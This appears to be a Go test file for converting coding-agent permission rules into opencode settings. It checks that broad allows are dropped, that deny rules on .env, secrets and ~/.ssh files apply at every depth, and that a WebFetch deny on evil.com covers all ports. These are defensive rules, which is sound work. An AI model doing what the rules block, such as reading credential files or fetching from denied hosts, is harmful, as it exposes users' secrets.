func TestOpencodePathTranslationNeverWidensAnAllow(t *testing.T) {
	warnings := captureWarnings(t)
	tests := []struct {
		rule string
		kept bool
	}{
		{"Read(./src/**)", true},
		{"Read(./src/*.go)", false}, // opencode's `*` crosses `/`
		{"Edit(src/*/gen.go)", false},
		{"Read(~/notes/**)", false}, // matched against worktree-relative paths, so it would never apply
		{"Read(//etc/**)", false},
	}
	for _, tt := range tests {
		t.Run(tt.rule, func(t *testing.T) {
			*warnings = nil
			keys, err := settings.PermissionKeys(permConfig(t.TempDir(), &config.Permissions{Allow: []string{tt.rule}}), "opencode", "")
			require.NoError(t, err)
			assert.Equal(t, tt.kept, len(keys) > 0)
			if !tt.kept {
				assert.True(t, hasWarning(*warnings, "allow rule", tt.rule, "not generated"), "got %v", *warnings)
			}
		})
	}
}

func TestOpencodePathDenyCoversRootAndNestedFiles(t *testing.T) {
	warnings := captureWarnings(t)
	tests := []struct {
		rule string
		want []string
	}{
		{"Read(./.env)", []string{".env", "**/.env"}},
		{"Read(**/.env)", []string{".env", "**/.env"}},
		{"Edit(./secrets/**)", []string{"secrets/**", "**/secrets/**"}},
	}
	for _, tt := range tests {
		t.Run(tt.rule, func(t *testing.T) {
			keys, err := settings.PermissionKeys(permConfig(t.TempDir(), &config.Permissions{Deny: []string{tt.rule}}), "opencode", "")
			require.NoError(t, err)
			require.Len(t, keys, 1)
			members := keys[0].Value.(map[string]any)
			for _, p := range tt.want {
				assert.Equal(t, "deny", members[p], "%v", members)
			}
		})
	}
	*warnings = nil
	_, err := settings.PermissionKeys(permConfig(t.TempDir(), &config.Permissions{Deny: []string{"Read(~/.ssh/**)"}}), "opencode", "")
	require.NoError(t, err)
	assert.True(t, hasWarning(*warnings, "SECURITY", "Read(~/.ssh/**)", "may not be enforced"), "got %v", *warnings)
}

func TestWebFetchDomainsAreLowercasedAndDeniesCoverPorts(t *testing.T) {
	captureWarnings(t)
	keys, err := settings.PermissionKeys(permConfig(t.TempDir(), &config.Permissions{
		Allow: []string{"WebFetch(domain:Docs.Example.COM)"}, Deny: []string{"WebFetch(domain:Evil.COM)"},
	}), "opencode", "")
	require.NoError(t, err)
	require.Len(t, keys, 1)
	members := keys[0].Value.(map[string]any)
	assert.Equal(t, "allow", members["https://docs.example.com/*"])
	assert.Equal(t, "deny", members["https://evil.com/*"])
	assert.Equal(t, "deny", members["https://evil.com:*"])
	assert.Equal(t, "deny", members["http://evil.com:*"])
	for name := range members {
		assert.Equal(t, strings.ToLower(name), name)
	}
}

